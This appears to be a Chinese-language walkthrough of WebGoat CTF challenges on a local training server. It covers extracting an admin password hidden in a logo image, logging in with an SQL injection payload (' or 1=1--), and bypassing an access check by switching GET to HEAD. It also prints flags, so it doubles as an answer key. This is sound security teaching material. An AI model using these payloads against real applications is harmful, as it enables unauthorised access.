---
id: 
title: Admin lost password
---
<!-- muse start -->

<!-- muse end -->

# 欢迎参加 WebGoat 挑战赛（CTF）

## 简介

本挑战赛包含一系列类似 CTF 的课程，我们不会提供任何任务说明或提示。您可以在服务器上运行 WebGoat，所有参与者均可加入并攻破挑战。积分榜可在 **scoreboard** 查看。

在此 CTF 中，您需要完成若干挑战。每个挑战将提供一个标志（flag），提交该标志即可获得积分。

标志格式如下：`a7179f89-906b-4fec-9d99-f15b796e7208`

## Admin lost password

查看示例解决方案：
显示一个logo图片，在数据中搜索`admin`得到隐写的内容
```PNG admin:!!webgoat_admin_7906!!```

## Without password

Can you login as Larry?

基准请求为
```http
POST /WebGoat/challenge/5 HTTP/1.1
Host: localhost:3000

username_login=Larry&password_login=foo
```
尝试用户名注入，但似乎无漏洞。
尝试密码注入时 `'` 响应500，构建向量
`username_login=Larry&password_login=foo' or 1=1--`



## Without account

Can you still vote?

查看示例解决方案：

基准请求为
```http
GET http://localhost:3000/WebGoat/challenge/8/vote/5 HTTP/1.1
host: localhost:3000
```
响应
```json
{
  "message" : "Sorry but you need to login first in order to vote",
  "error" : true
}
```

即，应用程序对此端点的 `GET` 请求拥有权限控制。
尝试修改头部以绕过
`HEAD http://localhost:3000/WebGoat/challenge/8/vote/5 HTTP/1.1`
响应
```http
HTTP/1.1 200
X-FlagController: Thanks for voting, your flag is: 3ac0e9f6-4ff9-4db4-9196-a33e26ba679b
```